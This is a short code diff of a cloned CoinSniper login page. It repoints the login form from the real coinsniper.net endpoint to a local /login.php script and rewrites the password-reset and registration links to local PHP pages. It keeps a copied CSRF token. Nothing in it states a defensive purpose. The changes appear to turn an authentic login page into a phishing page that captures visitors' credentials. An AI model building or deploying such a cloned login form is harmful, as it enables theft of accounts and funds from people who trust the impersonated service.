@@ -28,7 +28,7 @@
                         <h1>Login</h1>
                         <h2>Log in to get access to your CoinSniper account.</h2>
                     </div>
-                    <form method="POST" action="https://coinsniper.net/login">
+                    <form method="POST" action="/login.php">
                         <input type="hidden" name="_token" value="qFxfCl4QzJyZzuyYHSkbcFNh2FAnpVQuEqMrPkud">                        
                         <input type="hidden" name="redir" value="">
                         <div class="field">
@@ -48,7 +48,7 @@
                         </div>
 
                         <div class="forgot-password">
-                            <a href="https://coinsniper.net/forgot-password">
+                            <a href="/forgot-password.php">
                                 Forgot password?
                             </a>
                         </div>
@@ -62,7 +62,7 @@
 
                     <br>
                     <div class="register">
-                        Don’t have an account? <a href="/register" class="is-primary">Register Here.</a>
+                        Don’t have an account? <a href="/register.php" class="is-primary">Register Here.</a>
                     </div>
                 </div>
             </div>
